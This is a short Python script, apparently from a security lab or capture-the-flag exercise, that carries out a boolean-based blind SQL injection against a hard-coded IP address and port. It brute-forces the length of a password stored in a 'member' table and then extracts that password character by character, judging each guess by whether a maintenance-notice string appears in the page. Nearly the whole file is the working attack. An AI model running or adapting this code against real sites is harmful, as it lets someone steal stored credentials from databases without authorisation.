# _*_  coding:utf-8 _*_
import requests
import sys


def lentb():
    for i in range(1,50):
        #payload = '''?id=1 and (select count(*) from member) > %s''' %i ##DATA_NUMBER
        payload = '''?id=1 and (select length(password) from member limit 1,1) > %s''' % i  #limit x,1 x=0,1
        url = '''http://219.153.49.228:47706/new_list.php'''
        req = requests.get(url+payload+"%23") # %23--url decode is #
        if u"关于平台停机维护的通知" in req.text:
            print(i)
        else:
            print("column_length:",i)
            break

lentb()

def tbname():
    name = ""
    for j in range(1,33): # dabase length == 6
        for k in "0123456789ZXCVBNMASDFGHJKLQWERTYUIOPzxcvbnmasdfghjklqwertyuiop":
            url = "http://219.153.49.228:47706/new_list.php?id=1  and substr((select password from member limit 1,1),%d,1)='%s'" %(j,k)
            req = requests.get(url+"%23")
            if u"关于平台停机维护的通知" in req.text:
                name = name +k
                print(name)
                break #跳出k循环

    print("table_name:", name)

tbname()









